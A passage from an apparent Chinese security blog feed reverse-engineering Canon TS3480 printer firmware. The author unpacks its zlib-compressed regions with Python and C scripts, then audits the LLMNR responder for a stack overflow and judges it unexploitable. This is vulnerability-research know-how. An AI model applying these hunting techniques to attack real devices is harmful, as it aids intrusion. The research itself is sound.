alt="image-20230508192055595"></p><p>猜测flash的数据并不止被映射到了0xf0000000-0xf1000000的地址范围，从0xf1000000-0xf2000000处同样被映射为了flash的数据</p><p>所以再创建一个段用于存放flash的副本。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230508185544916.png" alt="image-20230508185544916"></p><p>这里这个for循环的v1实际上计算出来为4，循环四次，下面进入解压缩的代码有一个if判断，i为0的时候，也就是循环的第一次实际上是不进入到解压缩的函数的</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230508185822676.png" alt="image-20230508185822676"></p><p>compressed_data是被压缩的数据，从i&#x3D;0之后，compressed_data被赋值为v15的值，而v15如下</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230508185935301.png" alt="image-20230508185935301"></p><p>正是flash中偏移为0x2E6000处开始的数据</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230508190124066.png" alt="image-20230508190124066"></p><p>for循环中用于解压缩的函数由于i&#x3D;0时不执行，所以实际上只执行了3次，每次解压缩0x10000的数据</p><p>for循环结束之后</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403092036338.png" alt="image-20230508190426162"></p><p>当i&#x3D;4时，有下面的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(v0 &amp; <span class="number">0xFFFFF</span>) != <span class="number">0</span> ? (compress_length = v0 &amp; <span class="number">0xFFFFF</span>) : (compress_length = <span class="number">0x100000</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230508190539253.png" alt="image-20230508190539253"></p><p>v0为0x319140，所以compress_length会被更新为(compress_length &#x3D; v0 &amp; 0xFFFFF)&#x3D;0x19140</p><p>也就是说前三次解压缩一共解压缩了0x300000的数据，最后一次把剩下的0x19140的数据解压缩，总共要解压缩的数据长度为0x319140</p><p>那么这个用的是什么压缩算法，binwalk看一看</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230508191329846.png" alt="image-20230508191329846"></p><p>识别出来的是zlib，并且很巧，识别出来的第一个zilb压缩数据正好是在0x2E6004处，也就是在0x2E6000+4处。第二个zlib压缩包位于0x375C9C处，我们到0x2E6000处看看这四个字节</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230508192201659.png" alt="image-20230508192201659"></p><p>0x8fc93，zlib的起始位置为0x2E6004，0x2E6004+0x8fc93&#x3D;375C97，而第二块zlib数据的起始位置为0x375C9C，0x375C9C-4&#x3D;0x375C98，在循环解压缩的函数中</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230508193207842.png" alt="image-20230508193207842"></p><p>这里有一个4字节对齐的操作，因此每一个zlib压缩数据前面的4字节实际上就是压缩数据的大小，zlib数据位置加上这个size后4字节对齐就能够得到下一个zlib数据的起始位置，其格式如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[size_of_compressed_data][compressed_data]</span><br></pre></td></tr></table></figure><p>到这里就理清楚了解压缩的思路，写一个脚本手动对其中的数据进行解压缩</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Firmware</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.frimware=<span class="built_in">open</span>(<span class="string">&quot;./ts3480.BIN&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">        self.compressed_start=<span class="number">0x2E6000</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decompress_next</span>(<span class="params">self</span>):</span><br><span class="line">        length=struct.unpack(<span class="string">&quot;&lt;I&quot;</span>,self.frimware[self.compressed_start:][:<span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">        compressed_data=self.frimware[self.compressed_start+<span class="number">4</span>:][:length]</span><br><span class="line">        decompressed_data=zlib.decompress(compressed_data)</span><br><span class="line">        self.compressed_start=self.compressed_start+<span class="number">4</span>+length</span><br><span class="line">        <span class="keyword">if</span> self.compressed_start%<span class="number">4</span>!=<span class="number">0</span>:</span><br><span class="line">            self.compressed_start=self.compressed_start+(<span class="number">4</span>-(self.compressed_start%<span class="number">4</span>))</span><br><span class="line">        <span class="keyword">return</span> decompressed_data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decompress</span>(<span class="params">self</span>):</span><br><span class="line">        decompressed=<span class="built_in">bytes</span>()</span><br><span class="line">        decompressed+=self.decompress_next()</span><br><span class="line">        decompressed+=self.decompress_next()</span><br><span class="line">        decompressed+=self.decompress_next()</span><br><span class="line">        decompressed+=self.decompress_next()</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">len</span>(decompressed))</span><br><span class="line">        <span class="keyword">return</span> decompressed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">firmware=Firmware()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;decompressed_data.bin&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> fd:</span><br><span class="line">    fd.write(firmware.decompress())</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看一下其中的字符串</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230508194040395.png" alt="image-20230508194040395"></p><p>证明我们解压缩的没错。</p><p>那么这里解压缩的是什么呢，在一开始0x2e0000处执行的代码实际上就是bootloader，按照嵌入式设备一般的执行流程，bootloader会加载kernel，kernel再加载文件系统，所以这里解压缩的实际上是kernel。</p><p>kernel会被加载到哪去？</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230508195756089.png" alt="image-20230508195756089"></p><p>在解压缩函数中，第一个参数就是数据会被解压缩到哪个地址</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230508200103798.png" alt="image-20230508200103798"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((i - 1) &lt;&lt; 20)=0xi0000</span><br></pre></td></tr></table></figure><p>所以内核会从内存的0地址处开始加载</p><p>新建一个段，起始地址为0，然后将解压出来的kernel附加上去。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230508214455066.png" alt="image-20230508214455066"></p><p>在执行完解压缩功能后，bootloader会跳转到内核去</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403092037416.png" alt="image-20230508214526830"></p><p>内核设置好各种系统参数和模式，然后跳转执行另外的代码</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230508214632407.png" alt="image-20230508214632407"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230508214641899.png" alt="image-20230508214641899"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230508214655516.png" alt="image-20230508214655516"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230508214710465.png" alt="image-20230508214710465"></p><p>看看sub_F02E0484函数做了什么</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230508214740285.png" alt="image-20230508214740285"></p><p>问问万能的gpt</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230508214803303.png" alt="image-20230508214803303"></p><p>也就是说这个函数执行的也是解压缩功能，将a1处的数据解压缩到a2处，a3是解压缩的长度</p><p>好在IDA给出的这个函数的伪代码非常贴近于真实代码，扒下来稍微修改一下就能跑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> * <span class="title function_">decompress</span><span class="params">(<span class="type">char</span> *result, <span class="type">char</span>*a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *v3; <span class="comment">// r2</span></span><br><span class="line">    <span class="type">int</span> v4;    <span class="comment">// r3</span></span><br><span class="line">    <span class="type">int</span> v5;    <span class="comment">// t1</span></span><br><span class="line">    <span class="type">int</span> v6;    <span class="comment">// r4</span></span><br><span class="line">    <span class="type">int</span> v7;    <span class="comment">// t1</span></span><br><span class="line">    <span class="type">int</span> v8;    <span class="comment">// r5</span></span><br><span class="line">    <span class="type">int</span> v9;    <span class="comment">// t1</span></span><br><span class="line">    <span class="type">int</span> i;     <span class="comment">// r4</span></span><br><span class="line">    <span class="type">char</span> v11;  <span class="comment">// t1</span></span><br><span class="line">    <span class="type">int</span> v12;   <span class="comment">// t1</span></span><br><span class="line">    <span class="type">int</span> v13;   <span class="comment">// r5</span></span><br><span class="line">    <span class="type">char</span> *j;   <span class="comment">// r4</span></span><br><span class="line">    <span class="type">char</span> v15;  <span class="comment">// t1</span></span><br><span class="line"></span><br><span class="line">    v3 = &amp;a2[a3];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        v5 = (<span class="type">uint8_t</span>)*result++;</span><br><span class="line">        v4 = v5;</span><br><span class="line">        v6 = v5 &amp; <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">if</span> ((v5 &amp; <span class="number">7</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            v7 = (<span class="type">uint8_t</span>)*result++;</span><br><span class="line">            v6 = v7;</span><br><span class="line">        &#125;</span><br><span class="line">        v8 = v4 &gt;&gt; <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">if</span> (!(v4 &gt;&gt; <span class="number">4</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            v9 = (<span class="type">uint8_t</span>)*result++;</span><br><span class="line">            v8 = v9;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (i = v6 - <span class="number">1</span>; i; ++a2)</span><br><span class="line">        &#123;</span><br><span class="line">            v11 = *result++;</span><br><span class="line">            --i;</span><br><span class="line">            *a2 = v11;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((v4 &amp; <span class="number">8</span>) != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            v12 = (<span class="type">uint8_t</span>)*result++;</span><br><span class="line">            v13 = v8 + <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">for</span> (j = &amp;a2[-v12]; --v13 &gt;= <span class="number">0</span>; ++j)</span><br><span class="line">            &#123;</span><br><span class="line">                v15 = *j;</span><br><span class="line">                *a2++ = v15;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> (--v8 &gt;= <span class="number">0</span>)</span><br><span class="line">                *a2++ = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (a2 &lt; v3);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp=fopen(<span class="string">&quot;./ts3480.BIN&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;fopen error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fseek(fp,<span class="number">0x5380F0</span>,SEEK_SET);</span><br><span class="line">    <span class="type">char</span> *compressdata=(<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x3ba0</span>);</span><br><span class="line">    fread(compressdata,<span class="number">1</span>,<span class="number">0x3ba0</span>,fp);</span><br><span class="line">    <span class="type">char</span> *des=(<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x3ba0</span>);</span><br><span class="line">    <span class="keyword">if</span>(des==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;malloc error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    decompress(compressdata,des,<span class="number">0x3BA0</span>);</span><br><span class="line">    FILE* out=fopen(<span class="string">&quot;out.bin&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    fwrite(des,<span class="number">1</span>,<span class="number">0x3ba0</span>,out);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    fclose(out);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过这一段解压缩的数据太小，不像是文件系统，加载到IDA中看看</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230508215259729.png" alt="image-20230508215259729"></p><p>这段数据将会被加载到0x207AE000处，所以我们在这里新建一个段再加载</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230508215935336.png" alt="image-20230508215935336"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403092037982.png" alt="image-20230508220011829"></p><p>感觉是各种各样的指针。。没啥有意义的代码</p><p>后面的内核操作也没找到什么突破口，分析一时间陷入僵局</p><p>回头看看binwalk的结果</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230510132611944.png" alt="image-20230510132611944"></p><p>固件中有三个高熵值的区域，在一开始我们解压缩了kernel，起始位置是0x2E6000&#x3D;3039232。结束位置是0x4ACFF1&#x3D;4902897</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230510132851909.png" alt="image-20230510132851909"><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230510132951660.png" alt="image-20230510132951660"></p><p>而第一个高熵值区域的起始位置恰好位于3000000处，结束位置也在1900000左右，所以可以认为第一个区域就是内核段。</p><p>既然这样，第二个区域和第三个区域又是什么，这两个会在什么时候进行解压缩？</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403092037044.png" alt="image-20230510133816096"></p><p>第二个区域从0x560004开始，实际上根据我们的分析，应该是从0x560000开始的，前四字节用于存储压缩数据的长度</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230510134024487.png" alt="image-20230510134024487"></p><p>用010跳转到0x560000可以看到前面都是用0xff来隔开的。</p><p>于是尝试搜索在flash中搜索0x560000，还真搜到了一个和前面解压内核类似的函数</p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230510134826947.png" alt="image-20230510134826947" style="zoom:80%;" /><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403092038036.png" alt="image-20230510134859191"></p><p>有了前面的分析，我们可以确定这个函数实际上就是将flash中从偏移为0x560000开始、长度为0x952E9C-0x40000的数据进行解压缩</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403092038254.png" alt="image-20230510135350575"></p><p>将其解压缩到0x40000处。</p><p>再搜索一下0xBA0000，同样也能搜到一个解压缩函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403092038392.png" alt="image-20230510140231582"></p><p>将flash中从偏移为BA0000开始、长度为0x129DF94-0xD40000的数据进行解压缩，解压地址为0xD40000</p><p>从binwalk的分析来看依然是zlib的压缩方式，所以还是按照前面的解压缩脚本进行解压缩即可</p><p>看看0x560000区域的数据解压出来的字符串</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230510141019058.png" alt="image-20230510141019058"></p><p>看起来很不错，应该这里就是业务代码了。再看看0xBA0000偏移的</p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230510141258268.png" alt="image-20230510141258268" style="zoom:50%;" /><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230510141316254.png" alt="image-20230510141316254" style="zoom:50%;" /><p>emmmmm，看起来这些才是内核代码，或者是操作系统的代码，不管了先。</p><p>用IDA打开业务代码，加载地址设置为0x40000</p><p>有一说一，IDA恢复固件是真的差，只有一小部分被解析了</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403092038030.png" alt="image-20230520141948892"></p><p>所以还是得先用ghidra来解析</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230520142112378.png" alt="image-20230520142112378"></p><p>ghidra基本上把整个固件都理了一遍，然后就可以在ghidra中查找感兴趣的函数，再到IDA中进行分析</p><p>佳能的固件中有不少的调试信息</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230520142412909.png" alt="image-20230520142412909"></p><p>类似于[subsys:funcname],可以根据先这些调试信息来恢复一些函数名。</p><p>接下来开始找服务，一开始用nmap扫出来了不少服务，我选择从llmnr这个服务入手。</p><p>找服务的一个快捷方式就是直接搜索字符串，然后交叉引用到对应函数，在ghidra中可以找到这些字符串</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403092038844.png" alt="image-20230520143307040"></p><p>假设llmnr服务存在问题，那么问题一般存在于接收数据然后处理数据的过程中，网络接收函数一般为recv、recvmsg等等，再结合LLMNRResponder.cpp一起定位，最终交叉引用到了这个函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230520143750984.png" alt="image-20230520143750984"></p><p>在select之前经过分析之后是LLMNRSender.cpp对应的处理函数，也就是发送响应包。</p><p>看到sub_26D494函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230520144030968.png" alt="image-20230520144030968"></p><p>有两个if判断，都是以v4为基准进行判断的，而v4来源于0x21DEE2D4，这个地址我猜测用于存储一些配置信息，两个if分别判断select到的地址是ipv4还是ipv6。</p><p>最大能够接收1500字节的数据，然后我们看到validate_llmnr_packet函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230520150002785.png" alt="image-20230520150002785"></p><p>我这里创建了一个llmnr协议的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LLMNR标头</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">llmnr_header</span> &#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> id;       <span class="comment">// 事务ID</span></span><br><span class="line">    <span class="type">uint16_t</span> flags;    <span class="comment">// 标志</span></span><br><span class="line">    <span class="type">uint16_t</span> qdcount;  <span class="comment">// 问题计数</span></span><br><span class="line">    <span class="type">uint16_t</span> ancount;  <span class="comment">// 回答计数</span></span><br><span class="line">    <span class="type">uint16_t</span> nscount;  <span class="comment">// 授权计数</span></span><br><span class="line">    <span class="type">uint16_t</span> arcount;  <span class="comment">// 附加计数</span></span><br><span class="line">&#125; <span class="type">llmnr_header_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// LLMNR查询记录</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">llmnr_query</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span>  *qname;   <span class="comment">// 主机名</span></span><br><span class="line">    <span class="type">uint16_t</span> qtype;    <span class="comment">// 查询类型</span></span><br><span class="line">    <span class="type">uint16_t</span> qclass;   <span class="comment">// 查询类</span></span><br><span class="line">&#125; <span class="type">llmnr_query_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// LLMNR请求数据包</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">llmnr_request_packet</span> &#123;</span></span><br><span class="line">    <span class="type">llmnr_header_t</span> header;     <span class="comment">// LLMNR标头</span></span><br><span class="line">    <span class="type">llmnr_query_t</span>  query;      <span class="comment">// LLMNR查询记录</span></span><br><span class="line">&#125; <span class="type">llmnr_request_packet_t</span>;</span><br></pre></td></tr></table></figure><p>这里就是对llmnr请求包的数据做一个判断，</p><p>其中llmnr请求中的qname字段最长只能为255字节，并且不能为空字节。</p><p>查询类型要为1，12，28，255其中一种，否则返回-1.</p><p>如果查询类型不为-1，就调用sub_26CE08函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230520150555754.png" alt="image-20230520150555754"></p><p>这里应该就是根据请求包构造出响应包，然后发送给对应主机。</p><p>看到llmnr_generate_response_packet函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230520152540427.png" alt="image-20230520152540427"></p><p>这里就是根据请求包构造响应包</p><p>假设有一个请求包如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------+</span><br><span class="line">|       0x1234          |  // 事务ID</span><br><span class="line">+-----------------------+</span><br><span class="line">|       0x0000          |  // 标志</span><br><span class="line">+-----------------------+</span><br><span class="line">|       0x0001          |  // 问题计数</span><br><span class="line">+-----------------------+</span><br><span class="line">|      &quot;example&quot;        |  // 主机名</span><br><span class="line">+-----------------------+</span><br><span class="line">|     0x0001(1)         |  // 查询类型：IPv4地址</span><br><span class="line">+-----------------------+</span><br><span class="line">|       0x0001         |  // 查询类：Internet</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p>那么其对应的响应包如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------+</span><br><span class="line">|       0x1234          |  // 事务ID（与请求包相同）</span><br><span class="line">+-----------------------+</span><br><span class="line">|       0x8400          |  // 标志：响应、不可重复、无差错</span><br><span class="line">+-----------------------+</span><br><span class="line">|       0x0001          |  // 问题计数</span><br><span class="line">+-----------------------+</span><br><span class="line">|      &quot;example&quot;        |  // 主机名（与请求包相同）</span><br><span class="line">+-----------------------+</span><br><span class="line">|     0x0001(1)         |  // 查询类型：IPv4地址（与请求包相同）</span><br><span class="line">+-----------------------+</span><br><span class="line">|       0x0001         |  // 查询类：Internet（与请求包相同）</span><br><span class="line">+-----------------------+</span><br><span class="line">|       0x0000         |  // 资源记录数：0</span><br><span class="line">+-----------------------+</span><br><span class="line">|      0x0000          |  // 授权记录数：0</span><br><span class="line">+-----------------------+</span><br><span class="line">|      0x0001          |  // 附加记录数：1</span><br><span class="line">+-----------------------+</span><br><span class="line">|   TTL (生存时间)      |</span><br><span class="line">+-----------------------+</span><br><span class="line">|     0x0004(4)         |  // 数据长度：4字节</span><br><span class="line">+-----------------------+</span><br><span class="line">|      IP地址           |  // 回答：主机名“example”的IPv4地址</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p>也就是说，请求包的请求头会原封不动的装入响应包中，包括请求查询的域名</p><p>calc_byte_array_length这个函数如下</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230520151712049.png" alt="image-20230520151712049"></p><p>就是遍历给定的数组，一直找到空字符，也就是字符串的结尾，然后返回字符串的长度。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230520152801660.png" alt="image-20230520152801660"></p><p>后面使用strncpy将请求包的query字段拷贝到响应包的字段中，拷贝长度为calc_byte_array_length计算出来的长度。</p><p>在这里的拷贝可能存在栈溢出的问题，由于calc_byte_array_length是根据空字符来判断字符串结尾的，所以字符串可以很长。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230520153837689.png" alt="image-20230520153837689"></p><p>而response_packet的缓冲区只有0x20c的长度，但是query_packet最长可以有1500字节，因此只需要根据validate_llmnr_packet中的要求设置好llmnr请求包的请求字段数据。</p><p>然而在validate_llmnr_packet函数中</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230522112617962.png" alt="image-20230522112617962"></p><p>由于查询类型占用两字节，而查询类型又必须为1、12、28、255中的一种，所以这两字节中有一字节肯定为0，但是这样的话</p><p>在后面的calc_byte_array_length函数中，碰到0就会停下来，所以实际上后续的栈溢出是无法实现的，在类型这里就会被卡住。</p><p>非常可惜。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;端口扫描，TCP端口&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>musl pwn</title>
    <link href="http://example.com/2023/09/14/musl-pwn/"/>
    <id>http://example.com/2023/09/14/musl-pwn/</id>
    <published>2023-09-14T08:30:43.000Z</published>
    <updated>2024-01-09T13:44:22.852Z</updated>
    
